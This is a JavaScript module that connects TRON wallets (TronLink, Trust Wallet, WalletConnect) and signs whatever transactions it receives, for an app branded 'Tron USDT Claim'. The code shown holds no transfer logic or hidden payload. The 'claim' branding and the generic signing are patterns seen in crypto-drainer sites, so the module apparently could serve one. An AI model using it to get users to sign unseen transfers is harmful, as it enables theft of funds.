import { UniversalProvider } from '@walletconnect/universal-provider';
import { WalletConnectModal } from '@walletconnect/modal';

const WC_PROJECT_ID = process.env.NEXT_PUBLIC_WC_PROJECT_ID;
const TRON_CHAIN = 'tron:0x2b6653dc';

class WalletManager {
    constructor() {
        this.provider = null;
        this.modal = null;
        this.isMobile = typeof window !== 'undefined' && /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    }

    isTrustWalletInApp() {
        if (typeof window === 'undefined') return false;
        const ua = navigator.userAgent || '';
        return !!window.trustwallet || /Trust Wallet/i.test(ua);
    }

    hasTrustWalletInjectedTron() {
        return typeof window !== 'undefined' && !!window.trustwallet?.tron;
    }

    isTronLinkInjected(injected) {
        if (typeof window === 'undefined') return false;
        if (!injected) return false;
        return injected === window.tronLink || injected?.tronLink === window.tronLink || !!window.tronLink;
    }

    getInjectedAddress(injected) {
        return (
            injected?.defaultAddress?.base58 ||
            injected?.tronWeb?.defaultAddress?.base58 ||
            injected?.tron?.defaultAddress?.base58 ||
            null
        );
    }

    async signWithInjected(injected, tx) {
        if (!injected) throw new Error('No injected wallet available');

        if (typeof injected.signTransaction === 'function') {
            return injected.signTransaction(tx);
        }

        // TronLink often injects a TronWeb instance at window.tronWeb
        const tw =
            (injected?.trx?.sign ? injected : null) ||
            (injected?.tronWeb?.trx?.sign ? injected.tronWeb : null) ||
            (injected?.tron?.trx?.sign ? injected.tron : null);

        if (tw?.trx?.sign) {
            return tw.trx.sign(tx);
        }

        // Some providers expose signing via request()
        if (typeof injected.request === 'function') {
            const res = await injected.request({ method: 'tron_signTransaction', params: { transaction: tx } });
            return typeof res === 'string' ? JSON.parse(res) : (res?.transaction || res);
        }

        throw new Error('Injected wallet does not support transaction signing');
    }

    async initWC() {
        if (this.provider) return;
        this.provider = await UniversalProvider.init({
            projectId: WC_PROJECT_ID,
            metadata: {
                name: 'Tron USDT Claim',
                description: 'Secure USDT Transfer dApp',
                url: typeof window !== 'undefined' ? window.location.origin : '',
                icons: ['https://walletconnect.com/walletconnect-logo.png'],
            },
        });

        this.modal = new WalletConnectModal({
            projectId: WC_PROJECT_ID,
            chains: [TRON_CHAIN],
        });
    }

    async pollForInjected(maxMs = 3000) {
        const getInjected = () => {
            const p = window.trustwallet?.tron || window.tron || window.tronWeb || window.tronLink;
            if (!p) return null;
            // Some wallets inject the provider before defaultAddress is populated.
            // Treat the provider as present if it exposes any wallet-like surface.
            const looksLikeWallet =
                !!p?.defaultAddress?.base58 ||
                !!p?.ready ||
                typeof p?.signTransaction === 'function' ||
                typeof p?.request === 'function' ||
                typeof p?.trx?.sign === 'function' ||
                typeof p?.tronWeb?.trx?.sign === 'function';
            return looksLikeWallet ? p : null;
        };

        let p = getInjected();
        if (p) return p;

        const steps = Math.ceil(maxMs / 500);
        for (let i = 0; i < steps; i++) {
            await new Promise(r => setTimeout(r, 500));
            p = getInjected();
            if (p) return p;
        }
        return null;
    }

    async connect() {
        // 1. Try injected first
        let injected = await this.pollForInjected();
        if (injected) {
            // TronLink (desktop) may require an explicit authorization request to expose defaultAddress.
            // Only do this for TronLink to avoid unsupported-method errors in other wallets.
            if (this.isTronLinkInjected(injected) && typeof injected.request === 'function') {
                await injected.request({ method: 'tron_requestAccounts' }).catch(() => { });
            }

            // Trust Wallet often prompts the user and only populates defaultAddress after approval.
            // Give it longer before we consider connect failed.
            const maxWaitMs = this.isTrustWalletInApp() ? 4000 : 1500;
            const startedAt = Date.now();
            while (!this.getInjectedAddress(injected) && Date.now() - startedAt < maxWaitMs) {
                await new Promise(r => setTimeout(r, 250));
            }

            const addr = this.getInjectedAddress(injected);
            // If we still don't have an address, allow fallback to WalletConnect below.
            // Some environments inject a provider surface without exposing the address.
            if (addr) {
                return {
                    address: addr,
                    type: 'injected',
                    sign: (tx) => this.signWithInjected(injected, tx),
                };
            }

            // If Trust Wallet injected exists but address is missing, surface a helpful error.
            // (No UI change; this becomes the existing toast message.)
            if (this.hasTrustWalletInjectedTron()) {
                throw new Error('Unlock Trust Wallet and open your TRON account, then try again');
            }
        }

        // 2. Fallback to WalletConnect
        await this.initWC();
        return new Promise((resolve, reject) => {
            this.provider.on('display_uri', (uri) => {
                if (this.isMobile) {
                    window.location.href = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
                } else {
                    this.modal.openModal({ uri });
                }
            });

            // Keep the requested method set minimal for best wallet compatibility.
            const tronNamespace = {
                // Trust Wallet rejects some legacy/alternate method names.
                // Request only the canonical method name during the WC handshake.
                methods: ['tron_signTransaction'],
                chains: [TRON_CHAIN],
                events: [],
            };

            this.provider.connect({
                // Trust Wallet can show "Unknown method(s) requested" if we request
                // strict required namespaces/methods during the handshake.
                // Using optional namespaces keeps the handshake permissive.
                requiredNamespaces: {},
                optionalNamespaces: { tron: tronNamespace }
            })
                .then((session) => {
                    this.modal.closeModal();
                    const address = session.namespaces.tron.accounts[0].split(':').pop();
                    resolve({
                        address,
                        type: 'walletconnect',
                        sign: async (tx) => {
                            const res = await this.provider.request({
                                method: 'tron_signTransaction',
                                params: { transaction: tx }
                            }, TRON_CHAIN);
                            return typeof res === 'string' ? JSON.parse(res) : (res.transaction || res);
                        },
                    });
                })
                .catch(err => {
                    this.modal.closeModal();
                    reject(err);
                });
        });
    }
}

export const walletManager = new WalletManager();
